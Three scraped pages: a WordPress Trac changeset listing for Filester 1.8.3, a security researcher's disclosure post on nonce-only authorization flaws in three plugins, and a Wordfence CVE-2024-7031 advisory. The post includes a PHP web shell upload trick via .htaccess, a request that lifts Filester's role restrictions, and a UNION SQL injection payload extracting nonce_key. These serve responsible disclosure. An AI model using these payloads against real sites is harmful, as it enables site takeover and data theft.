=== Content from plugins.trac.wordpress.org_8d6ba23a_20250111_080405.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F3129722)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/3129721 "Changeset 3129721")
* [Next Changeset](/changeset/3129723 "Changeset 3129723") →

---

# Changeset 3129722

Timestamp:
08/01/2024 08:03:00 PM
([5 months](/timeline?from=2024-08-01T20%3A03%3A00Z&precision=second "See timeline at 08/01/2024 08:03:00 PM") ago)

Author:
ninjateam
Message:

Version 1.8.3

Location:
[filester/trunk](/browser/filester/trunk?rev=3129722)
Files:

2 added
8 deleted
20 edited

* [assets/css/file\_manager\_admin.css](/browser/filester/trunk/assets/css/file_manager_admin.css?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/assets/css/file_manager_admin.css "Show differences"))
* [includes/File\_manager/FileManager.php](/browser/filester/trunk/includes/File_manager/FileManager.php?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/FileManager.php "Show differences"))
* [includes/File\_manager/lib/Changelog](/browser/filester/trunk/includes/File_manager/lib/Changelog?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/Changelog "Show differences"))
* [includes/File\_manager/lib/LICENSE.md](/browser/filester/trunk/includes/File_manager/lib/LICENSE.md?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/LICENSE.md "Show differences"))
* [includes/File\_manager/lib/README.md](/browser/filester/trunk/includes/File_manager/lib/README.md?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/README.md "Show differences"))
* [includes/File\_manager/lib/css/elfinder.full.css](/browser/filester/trunk/includes/File_manager/lib/css/elfinder.full.css?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/css/elfinder.full.css "Show differences"))
* [includes/File\_manager/lib/css/elfinder.min.css](/browser/filester/trunk/includes/File_manager/lib/css/elfinder.min.css?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/css/elfinder.min.css "Show differences"))
* [includes/File\_manager/lib/elfinder.html](/browser/filester/trunk/includes/File_manager/lib/elfinder.html?rev=2305469 "Show what was removed (content at revision 3129721)")
  (deleted)
* [includes/File\_manager/lib/elfinder.legacy.html](/browser/filester/trunk/includes/File_manager/lib/elfinder.legacy.html?rev=2305469 "Show what was removed (content at revision 3129721)")
  (deleted)
* [includes/File\_manager/lib/index.php](/browser/filester/trunk/includes/File_manager/lib/index.php?rev=2436125 "Show what was removed (content at revision 3129721)")
  (deleted)
* [includes/File\_manager/lib/js/elfinder.full.js](/browser/filester/trunk/includes/File_manager/lib/js/elfinder.full.js?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/js/elfinder.full.js "Show differences"))
* [includes/File\_manager/lib/js/elfinder.min.js](/browser/filester/trunk/includes/File_manager/lib/js/elfinder.min.js?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/js/elfinder.min.js "Show differences"))
* [includes/File\_manager/lib/js/extras/editors.default.js](/browser/filester/trunk/includes/File_manager/lib/js/extras/editors.default.js?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/js/extras/editors.default.js "Show differences"))
* [includes/File\_manager/lib/js/i18n/elfinder.zh\_TW.js](/browser/filester/trunk/includes/File_manager/lib/js/i18n/elfinder.zh_TW.js?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/js/i18n/elfinder.zh_TW.js "Show differences"))
* [includes/File\_manager/lib/js/i18n/help/fr.html.js](/browser/filester/trunk/includes/File_manager/lib/js/i18n/help/fr.html.js?rev=3129722 "Show entry in browser")
  (added)
* [includes/File\_manager/lib/js/i18n/help/zh\_TW.html.js](/browser/filester/trunk/includes/File_manager/lib/js/i18n/help/zh_TW.html.js?rev=3129722 "Show entry in browser")
  (added)
* [includes/File\_manager/lib/js/worker/quicklook.tiff.js](/browser/filester/trunk/includes/File_manager/lib/js/worker/quicklook.tiff.js?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/js/worker/quicklook.tiff.js "Show differences"))
* [includes/File\_manager/lib/js/worker/quicklook.unzip.js](/browser/filester/trunk/includes/File_manager/lib/js/worker/quicklook.unzip.js?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/js/worker/quicklook.unzip.js "Show differences"))
* [includes/File\_manager/lib/main.default.js](/browser/filester/trunk/includes/File_manager/lib/main.default.js?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/main.default.js "Show differences"))
* [includes/File\_manager/lib/package.json](/browser/filester/trunk/includes/File_manager/lib/package.json?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/package.json "Show differences"))
* [includes/File\_manager/lib/php/.tmp/zd-2F60.tmp](/browser/filester/trunk/includes/File_manager/lib/php/.tmp/zd-2F60.tmp?rev=2638488 "Show what was removed (content at revision 3129721)")
  (deleted)
* [includes/File\_manager/lib/php/.tmp/zd-3C9.tmp](/browser/filester/trunk/includes/File_manager/lib/php/.tmp/zd-3C9.tmp?rev=2638488 "Show what was removed (content at revision 3129721)")
  (deleted)
* [includes/File\_manager/lib/php/.tmp/zd-F9F7.tmp](/browser/filester/trunk/includes/File_manager/lib/php/.tmp/zd-F9F7.tmp?rev=2638488 "Show what was removed (content at revision 3129721)")
  (deleted)
* [includes/File\_manager/lib/php/elFinder.class.php](/browser/filester/trunk/includes/File_manager/lib/php/elFinder.class.php?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/php/elFinder.class.php "Show differences"))
* [includes/File\_manager/lib/php/elFinderVolumeDriver.class.php](/browser/filester/trunk/includes/File_manager/lib/php/elFinderVolumeDriver.class.php?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/php/elFinderVolumeDriver.class.php "Show differences"))
* [includes/File\_manager/lib/php/elFinderVolumeMySQL.class.php](/browser/filester/trunk/includes/File_manager/lib/php/elFinderVolumeMySQL.class.php?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/includes/File_manager/lib/php/elFinderVolumeMySQL.class.php "Show differences"))
* [includes/File\_manager/lib/php/index.php](/browser/filester/trunk/includes/File_manager/lib/php/index.php?rev=2436125 "Show what was removed (content at revision 3129721)")
  (deleted)
* [license.txt](/browser/filester/trunk/license.txt?rev=2305469 "Show what was removed (content at revision 3129721)")
  (deleted)
* [ninja-file-manager.php](/browser/filester/trunk/ninja-file-manager.php?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/ninja-file-manager.php "Show differences"))
* [readme.txt](/browser/filester/trunk/readme.txt?rev=3129722 "Show entry in browser")
  (modified)
  ([view diffs](/changeset/3129722/filester/trunk/readme.txt "Show differences"))

**Changeset view not shown**, since the total size (4.9 MB) exceeds
[4.0 MB](/wiki/TracIni#changeset-max_diff_bytes-option)

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=3129722)
* [Zip Archive](?format=zip&new=3129722)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from nowotarski.info_12bd53be_20250111_080401.html ===

[nowotarski.info](/)

[Home](/)
[Posts](/posts)
[Vulnerabilities](/vulnerabilities)

# Exploiting authorization by nonce in WordPress plugins

Posted on August 5, 2024 by Bartek Nowotarski

[Y](https://news.ycombinator.com/item?id=41170111)

**tl;dr:**
Many WordPress plugins use nonces and nothing else to authorize requests. This often has a potential for exploitation to gain privilege escalation. In this article, I elaborate on WordPress security features connected to nonces and AJAX/REST requests and describe three critical vulnerabilities I’ve found in popular WordPress plugins.

**Table of Contents**

* [About WordPress](#about-wordpress)
* [Built-in security features for plugins](#built-in-security-features-for-plugins)
  + [`wp_ajax` and REST handlers](#wp_ajax-and-rest-handlers)
  + [Nonce value generation](#nonce-value-generation)
* [Vulnerabilities](#vulnerabilities)
  + [Arbitrary File Upload / RCE in Advanced File Manager](#arbitrary-file-upload--rce-in-advanced-file-manager)
  + [Arbitrary File Upload / RCE in Filester](#arbitrary-file-upload--rce-in-filester)
  + [Semi-Blind SQL Injection in SEO Plugin by Squirrly](#semi-blind-sql-injection-in-seo-plugin-by-squirrly)

# About WordPress

As of 2024, WordPress powers 43% of all websites in the internet. 474 million websites run WordPress software and one or more out of 70 000 plugins. Unfortunately, as history shows, many WordPress plugins, even popular ones, often contain security vulnerabilities. Sometimes these vulnerabilities are trivial to find.

So far this year, 280 critical (CVSS score 9.0+) vulnerabilities have been found in WordPress plugins. Critical vulnerabilities usually allow taking over a WordPress instance which can lead to data leaks, malware injection, or transitioning them into C2 servers.

I’ve learned about the last example while reading [Turla APT spies on Polish NGOs](https://blog.talosintelligence.com/tinyturla-next-generation/) by Cisco Talos who explains attacks against polish NGOs. In this campaign compromised WordPress websites were used as Command & Control servers. This led me to do a (limited) WordPress plugins security research in Q2/2024.

In this article, I elaborate on WordPress security features connected to nonces and AJAX/REST requests. I also describe three critical vulnerabilities I’ve found in popular WordPress plugins (100k+, 100k+, 60k+ active installations).

# Built-in security features for plugins

Below I explain built-in security features that WordPress plugin developers can use for authentication, authorization, and nonces generation. Later, I will use some vulnerable plugins to show that these features are not always used as intended.

## `wp_ajax` and REST handlers

When testing web apps one of the first things I check are AJAX handlers and REST API calls. Very often these small snippets of code contain logic, authorization bugs, or simply miss authentication part to access them.

It was no different in WordPress plugins. I’ve found several instances in which there was no authorization at all or authorization was done by nonce which is not what nonces are meant to be used for.

WordPress has a built-in architecture for AJAX calls. Plugin developers can call:

```
1add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
2add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));

```

The `nopriv` part in the action name means that WordPress will skip the authentication step before executing the function handler, in other words: these AJAX calls are available for any users, also those who are not logged in.

It is a little bit different for REST API which is also a built-in functionality of WordPress. The API routes are registered using `register_rest_route` function:

```
1register_rest_route(
2    $this->namespace, '/get/', array(
3        'methods' => WP_REST_Server::READABLE,
4        'callback' => array($this, 'getData'),
5        'permission_callback' => '__return_true'
6    )
7);

```

The interesting part is `permission_callback` which is a callback to function responsible for checking if a given user is authorized to call the API method. As can be seen in the example above, often a built-in `__return_true` function is used which simply skips user permissions check. If there is no additional code to check permissions inside the API method handler, any user can call it.

## Nonce value generation

Another observation I made was that many WordPress plugins use nonces to authenticate and authorize users, often not checking if a given user has permissions to perform a given action or (in case of `nopriv` AJAX handlers) if a user is logged in at all.

WordPress has a built-in mechanism for generating and verifying nonces. Developers can use: `wp_create_nonce` to create and `wp_verify_nonce` to verify nonces. A nonce is generated using the following function:

```
 1function wp_create_nonce( $action = -1 ) {
 2    $user = wp_get_current_user();
 3    $uid  = (int) $user->ID;
 4    if ( ! $uid ) {
 5        /** This filter is documented in wp-includes/pluggable.php */
 6        $uid = apply_filters( 'nonce_user_logged_out', $uid, $action );
 7    }
 8
 9    $token = wp_get_session_token();
10    $i     = wp_nonce_tick( $action );
11
12    return substr( wp_hash( $i . '|' . $action . '|' . $uid . '|' . $token, 'nonce' ), -12, 10 );
13}

```

There are two parts of this function that may be unclear: how `wp_nonce_tick` and `wp_hash` work. `wp_nonce_tick` divides the current Unix timestamp by the lifespan of a nonce (default is 12 hours), resulting in a “tick” number that changes every 12 hours. This tick value ensures that nonces are time-sensitive, providing a measure of security against replay attacks by making nonces valid only within a specific time window. `wp_hash` is concatenating tick, action, user id, and token (if user logged in) then salting it and hashing using HMAC-MD5. The salt is the same for all hashes, it is either `NONCE_KEY` and `NONCE_SALT` or `SECRET_KEY` and `SECRET_SALT` if `NONCE_*` consts are not set.

There are two interesting properties of `wp_create_nonce` function.

Nonces can be generated *offline* for unauthenticated users if `NONCE_*` or `SECRET_*` consts are known. In this case, `$uid` will be equal `0` and `$token` will be an empty string. This means that Arbitrary File Read vulnerabilities that give access to `wp-config.php`, or SQL Injection vulnerabilities that allow reading these consts from a DB or simply XSS (against an admin with access to consts) can be chained to exploit access to the code execution in other plugins which are only protected by `wp_verify_nonce` function (like `wp_ajax_nopriv` handlers).

Another property is that nonce’s action parameter is not namespaced: any plugin can generate nonce for any other plugin or WordPress core. This means that any flaw which allows calling `wp_create_nonce` with arbitrary value can, again, lead to vulnerabilities in other plugins.

# Vulnerabilities

The next sections describe three vulnerabilities I’ve found in popular WordPress plugins. Two of these are exploiting `wp_ajax` handlers, REST API, and the fact that nonce is used as an authorization method (what has been discussed so far in this article). The third is an interesting *semi* Blind SQL Injection which also exploits the fact that an access token is available to all Contributor+ level users. This one could be adapted as a nice [CTF challenge](https://en.wikipedia.org/wiki/Capture_the_flag_%28cybersecurity%29)!

## Arbitrary File Upload / RCE in Advanced File Manager

Advanced File Manager is a WordPress plugin with 100k+ active installations. It was vulnerable to Remote Code Execution (by Arbitrary File Upload) that can be triggered by any user with access to the plugin, possibly also unauthenticated users (configurable in plugin settings) via `fma_load_shortcode_fma_ui` AJAX action.

The plugin has several protections against arbitrary `.htaccess` and `*.php` files upload: it checks uploaded file names but also tries to guess mime type based on file extension and file contents. Because of bugs in these protections, it was possible to upload `.htaccess` file that will make Apache webserver to run PHP code for extensions other than `.php`.

The first bug that allows `.htaccess` filename protection bypass can be found in `fma_plugin_file_validName` function:

```
230 function fma_plugin_file_validName($name) {
231	if(!empty($name)) {
232		$name = sanitize_file_name($name);
233		if(strpos($name, '.php') || strpos($name, '.ini') || strpos($name, '.htaccess') || strpos($name, '.config')) {
234			return false;
235		} else {
236			return strpos($name, '.') !== 0;
237		}
238	}
239}
```

When `.htaccess` value is passed in `$name` parameter it is changed to `htaccess` by `sanitize_file_name` which makes the consecutive `strpos` call to return `FALSE`. The consecutive `strpos($name, '.') !== 0;` in the `else` clause will return `TRUE` because . (dot) was removed previously by `sanitize_file_name`.

Because of this, we can upload a `.htaccess` file with the following contents:

```
AddType application/x-httpd-php .ptp

```

This will make Apache server interpret all `.ptp` files as PHP code and execute them.

Next, we can upload a PHP code file with `.ptp` extension. We bypass mime check by prepending the PHP code with 1000 ‘a’ letters:

```
1a x 1000 <br /><?php system($_GET['cmd']);

```

The remaining part to access vulnerable code is a nonce value however it can be found in the plugin frontend by any user with access to plugin:

```
1<script id="elfinder_script-js-extra">
2var afm_object = {"ajaxurl":"http:\/\/localhost:8080\/wp-admin\/admin-ajax.php","nonce":"14ce4b925e","locale":"en","ui":["toolbar","tree","path","stat"]};
3</script>

```
### Duplicate / wontfix?

Unfortunately, after reporting it to Wordfence (WordPress security company), I got a response that this is actually a duplicate of [CVE-2023-7061](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager-advanced-shortcode-2/advanced-file-manager-shortcode-253-authenticated-contributor-arbitrary-file-upload). I was confused because I was testing the latest release and the CVE ID is from 2023! After some digging, I discovered that there’s an upgrade to this plugin called Shortcodes which is also vulnerable to a very similar method of Arbitrary File Upload. What’s also interesting is that Wordfence published the report about the previously found issue *after* my report: on July 8, 2024 to be specific. I asked Wordfence team for clarifications and they responded that plugin developer didn’t bother to fix the previously reported issue. Because of this I treated it as `wontfix` and decided to publish the vulnerability details.

## Arbitrary File Upload / RCE in Filester

Filester is a WordPress Plugin with 60k+ active installations. It was vulnerable to Remote Code Execution (by Arbitrary File Upload) that can be triggered by any user with access to the plugin (configurable by Admin, with the lowest level being Subscriber).

Filester settings page allows admins to allow access to the plugin for certain roles. For each role, there are several settings like file extensions to lock or file extensions a given role is allowed to upload. Settings are saved using `wp_ajax_njt_fs_save_setting` AJAX action.

The vulnerability can be found in `njt_fs_saveSetting` function which runs the AJAX action above:

```
540    public function njt_fs_saveSetting()
541    {
542        if( ! wp_verify_nonce( $_POST['nonce'] ,'njt-fs-file-manager-admin')) wp_die();
543        check_ajax_referer('njt-fs-file-manager-admin', 'nonce', true);
```

```
560        //update options
561        update_option('njt_fs_settings', $this->options);
562        wp_send_json_success(get_option('njt_fs_settings'));
563        wp_die();
564    }
```

The problem with this function is that there is no code responsible for checking if the user calling the function is an Admin level user or has permission to change settings. Any user with a valid `njt-fs-file-manager-admin` nonce can trigger this AJAX function. Even though the action name for nonce contains `admin`, it is generated for all users with access to the plugin and is clearly visible in the plugin frontend code:

```
1<script id="njt_fs_elFinder-js-extra">
2var wpData = { ... ,"nonce":"82ca11f675", ... };
3</script>

```

Let’s say the Admin allowed Subscribers to use the plugin but locked `.php` files (when the extension is locked nothing can be done with a file: upload, download, rename, delete) and allowed uploading `.txt` files only. Any subscriber can send the following request to remove all restrictions for Subscriber level access:

```
 1POST /wp-admin/admin-ajax.php HTTP/1.1
 2Host: localhost:8080
 3Content-Length: 224
 4sec-ch-ua: "Chromium";v="125", "Not.A/Brand";v="24"
 5Accept: application/json, text/javascript, */*; q=0.01
 6Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 7X-Requested-With: XMLHttpRequest
 8sec-ch-ua-mobile: ?0
 9User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
10sec-ch-ua-platform: "macOS"
11Origin: http://localhost:8080
12Sec-Fetch-Site: same-origin
13Sec-Fetch-Mode: cors
14Sec-Fetch-Dest: empty
15Referer: http://localhost:8080/wp-admin/admin.php?page=njt-fs-filemanager
16Accept-Encoding: gzip, deflate, br
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18Cookie: ...
19Connection: keep-alive
20
21nonce=7136fcb48c&action=njt_fs_save_setting_restrictions&njt_fs_list_user_restrictions=subscriber&list_user_restrictions_alow_access=&private_folder_access=&private_url_folder_access=&hide_paths=&lock_files=&can_upload_mime=

```

This issue has been fixed in version 1.8.3 and has been assigned CVE-2024-7031.

## Semi-Blind SQL Injection in SEO Plugin by Squirrly

squirrly-seo WordPress plugin (100k+ active installations) is vulnerable to semi-blind SQL Injection in RestAPI endpoint. The root cause is in `controllers/Api.php` file. The `$url` parameter is not properly sanitized which allows appending `UNION` query to a `SELECT` SQL query in the `$query` variable. This allows extracting any information from WordPress DB.

### Searching for SQL injection in WordPress plugins

There are dozens of SQL queries in every WP plugin. A manual search for places that may provide injection opportunities seems cumbersome. That’s why I decided to write a little PHP code scanner that helped me find code snippets that might be vulnerable to SQL injection.

The idea is simple: first, find all occurrences of method calls interacting with a DB like `execute`, `query`, `get_row`, etc. with variable argument. This [regexp](https://regex101.com/r/1vhVKN/2) can help to find such calls (note we’re not matching `$wpdb` because plugins sometimes wrap it and use their own DB class):

```
/db->(get_[a-z]+|query|execute)\(\s*\$([a-zA-Z0-9_]*)\s*\)/

```

Second, take that variable’s name and check if its assigned value is a return value of `prepare()`. We can skip such snippets because they are most likely safe. This way we remove a ton of safe calls. Obviously, this method will still return a lot of false positives that need to be manually checked but the number of instances is much, much smaller than checking all of the DB calls.

### Getting one char at a time

Exploiting this vulnerability is not trivial (compared to vulnerabilities in which a passed SQL query is simply executed) but it is repeatable and can be trivially exploited when proper exploit code is developed or by using tools like Burp Suite. The complexity lies in the fact that the returned values of the appended query must be integers which are also valid IDs of existing posts in a victim WordPress DB.

The vulnerable code starts in `controllers/Api.php` at line 267 (`getData` method).

The problematic lines which will be explained below the code snippet are the following:

* 267: `$url`: attacker controlled variable,
* 281: `$url_decoded` variable derived from attacker controlled value, transformation allows SQL injection (passing `'` value to a query which is not `prepare()`’d),
* 285: SQL injection query,
* 291: query execution,
* 294: results parsing, the most interesting part.

```
245public function getData(WP_REST_Request $request)
246{
247
248    global $wpdb;
249    $response = array();
250    SQ_Classes_Helpers_Tools::setHeader('json');
251
252    //get the token from API
253    $token = $request->get_param('token');
254    if ($token <> '') {
255        $token = sanitize_text_field($token);
256    }
257
258    if (!$this->token || $this->token <> $token) {
259        exit(wp_json_encode(array('error' => esc_html__("Connection expired. Please try again.", 'squirrly-seo'))));
260    }
261
262    $select = $request->get_param('select');
263
264    switch ($select) {
265        case 'innerlinks':
266
267            $url = esc_url_raw($request->get_param('url'));
268            $start = (int)$request->get_param('start');
269            $limit = (int)$request->get_param('limit');
270
271            if ($url == '') {
272                exit(wp_json_encode(array('error' => esc_html__("Wrong Params", 'squirrly-seo'))));
273            }
274
275            //define vars
276            if($limit == 0) $limit = 1000;
277
278            //prepare the url for query
279            $url_backslash = str_replace('/','\/',str_replace(rtrim(home_url(),'/'),'',$url));
280            $url_encoded = urlencode(str_replace(trim(home_url(),'/'),'',$url));
281            $url_decoded = str_replace(trim(home_url(),'/'),'',urldecode($url));
282
283            //get post inner links
284            $select_table = $wpdb->prepare("SELECT ID, post_content FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit);
285            $query = "SELECT `ID` FROM ($select_table) as p WHERE (p.post_content LIKE '%$url%' OR p.post_content LIKE '%$url_backslash%' OR p.post_content LIKE '%$url_encoded%' OR p.post_content LIKE '%$url_decoded%')";
286
287            if(!$inner_links = wp_cache_get(md5($query))) {
288                //prepare the inner_links array
289                $inner_links = array();
290
291                if ( $rows = $wpdb->get_results( $query ) ) {
292                    if ( ! empty( $rows ) ) {
293                        foreach ( $rows as $row ) {
294                            if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
295                                $inner_links[] = get_permalink( $row->ID );
296                            }
297                        }
298                    }
299                }
300
301            }
```

First of all `$url` variable is controlled by a user and is used to create 3 other variables (`$url_backslack`, `$url_encoded` and `$url_decoded`) from which the last one is not properly escaping `'` character because `url_decode` PHP function is called on a user-provided parameter. So `%27` sequence will be changed to `'`.

This allows appending a `UNION` part to an existing `SELECT` query via `$url_decoded` variable because it is enclosed in `'` thus not properly escaped:

```
284$select_table = $wpdb->prepare("SELECT ID, post_content FROM `$wpdb->posts` WHERE `post_status` = %s ORDER BY ID DESC LIMIT %d,%d", 'publish', $start, $limit);
285$query = "SELECT `ID` FROM ($select_table) as p WHERE (p.post_content LIKE '%$url%' OR p.post_content LIKE '%$url_backslash%' OR p.post_content LIKE '%$url_encoded%' OR p.post_content LIKE '%$url_decoded%')";
```

Now, the interesting part. The returned rows are later parsed in a loop that appends values to the result array only if `get_permalink` function returns non-false value (in other words, when a post with such ID exists in `wp_posts` table):

```
294if ( untrailingslashit( get_permalink( $row->ID ) ) <> $url ) {
295    $inner_links[] = get_permalink( $row->ID );
296}
```

The result is later sent to the client in JSON response.

This is why I called it a *semi* Blind SQL Injection. An attacker can only use `wp_posts` IDs to extract values from the database. It is more complicated than a usual SQL Injection but not impossible. The trick is to get values we’re interested in one char at a time, then shift their byte value to map to the existing post ID. See the example SQL query in which we try to get `nonce_key` option value:

```
1SELECT
2    ASCII(SUBSTRING(option_value, 1, 1))-97 AS ID
3FROM wp_options
4WHERE option_name='nonce_key'

```

The `-97` part is a shift value that allows properly mapping the byte value to post ID. In instances with a small number of posts or with post IDs with gaps shifting is necessary. In my test instance, the plugin returned:

```
1{
2    "url": "http:\/\/%27)%20UNION%20SELECT%20ASCII(SUBSTRING(option_value,%201,%201))-97%20AS%20ID%20from%20wp_options%20WHERE%20option_name=%27nonce_key%27#",
3    "inner_links": ["http:\/\/localhost:8080\/?p=19"]
4}

```

This means that the first byte of `nonce_key` is: `t` because `19 + 97 = 116 = ASCII(t)`.

### Accessing the vulnerable function

The `getData` method is executed via `/index.php?rest_route=/squirrly/get` endpoint which requires a valid token (beginning of `getData`):

```
253$token = $request->get_param('token');
254if ($token <> '') {
255    $token = sanitize_text_field($token);
256}
257
258if (!$this->token || $this->token <> $token) {
259    exit(wp_json_encode(array('error' => esc_html__("Connection expired. Please try again.", 'squirrly-seo'))));
260}
```

However, this token is available to all users with level “Contributor” or higher because it is embedded in the “New Post” view (`/wp-admin/post-new.php`):

```
1<script id="59a0ca9a38-js-extra">
2var $sq_config = {... "url_token":"dc69d467c7150d77a63cdfd97bc24e86" ...};
3var $sq_params = {"max_length_title":"75","max_length_description":"320"};
4</script>

```

This vulnerability has been assigned CVE-2024-6497.

2024 © Bartek Nowotarski | [Archie Theme](https://github.com/athul/archie) | Built with [Hugo](https://gohugo.io)



=== Content from www.wordfence.com_5c1cd035_20250111_080406.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# File Manager Pro – Filester <= 1.8.2 - Authenticated Plugin Settings Update

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   File Manager Pro – Filester <= 1.8.2 - Authenticated Plugin Settings Update

7.5

**Missing Authorization**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2024-7031](https://www.cve.org/CVERecord?id=CVE-2024-7031) |
| --- | --- |
| CVSS | 7.5 (High) |
| Publicly Published | August 2, 2024 |
| Last Updated | August 3, 2024 |
| Researcher | [bart](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/bartek-nowotarski) |

### Description

The File Manager Pro – Filester plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the 'njt\_fs\_saveSettingRestrictions' function in all versions up to, and including, 1.8.2. This makes it possible for authenticated attackers, with a role that has been granted permissions by an Administrator, to update the plugin settings for user role restrictions, including allowing file types such as .php to be uploaded.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/filester/trunk/includes/File_manager/FileManager.php#L566)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/3129722/)

#### Share

